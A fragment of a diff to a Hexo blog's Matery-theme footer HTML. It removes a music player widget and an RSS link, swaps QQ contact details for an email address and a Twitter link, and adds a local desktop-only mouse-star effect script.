-</style>
-<div class="">
-    
-    <div class="row">
-        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
-                   server="netease"
-                   type="playlist"
-                   id="503838841"
-                   fixed='true'
-                   autoplay='false'
-                   theme='#42b983'
-                   loop='all'
-                   order='random'
-                   preload='auto'
-                   volume='0.7'
-                   list-folded='true'
-        >
-        </meting-js>
-    </div>
-</div>
-
-<script src="/libs/aplayer/APlayer.min.js"></script>
-<script src="/libs/aplayer/Meting.min.js"></script>
-
-    
 
     <div class="container row center-align"
          style="margin-bottom: 0px !important;">
         <div class="col s12 m8 l8 copy-right">
             Copyright&nbsp;&copy;
             
-                <span id="year">2019-2022</span>
+                <span id="year">2022</span>
             
-            <a href="/about" target="_blank">Jlan</a>
+            <a href="/about" target="_blank">J1an</a>
             |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
             |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
             <br>
@@ -934,7 +834,7 @@ php:">
 
 
 
-    <a href="mailto:1181062873@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+    <a href="mailto:jlan@icloud.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
         <i class="fas fa-envelope-open"></i>
     </a>
 
@@ -942,10 +842,8 @@ php:">
 
 
 
-
-
-    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1181062873" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1181062873" data-position="top" data-delay="50">
-        <i class="fab fa-qq"></i>
+    <a href="https://twitter.com/J1an45" class="tooltipped" target="_blank" data-tooltip="关注我的Twitter: https://twitter.com/J1an45" data-position="top" data-delay="50">
+        <i class="fab fa-twitter"></i>
     </a>
 
 
@@ -954,9 +852,7 @@ php:">
 
 
 
-    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
-        <i class="fas fa-rss"></i>
-    </a>
+
 
 </div>
     </div>
@@ -1116,6 +1012,14 @@ $(function () {
     
 
     <!-- 鼠标星星特效 -->
+     
+        <script type="text/javascript">
+            // 只在桌面版网页启用特效
+            var windowWidth = $(window).width();
+            if (windowWidth > 768) {
+                document.write('<script type="text/javascript" src="/libs/others/star.js"><\/script>');
+            }
+        </script>
     
 
      
@@ -1142,8 +1046,6 @@ $(function () {
     })();
 </script>
 
-    
-    <script src="/libs/others/clicklove.js" async="async"></script>
     
     
     <script async src="/libs/others/busuanzi.pure.mini.js"></script>
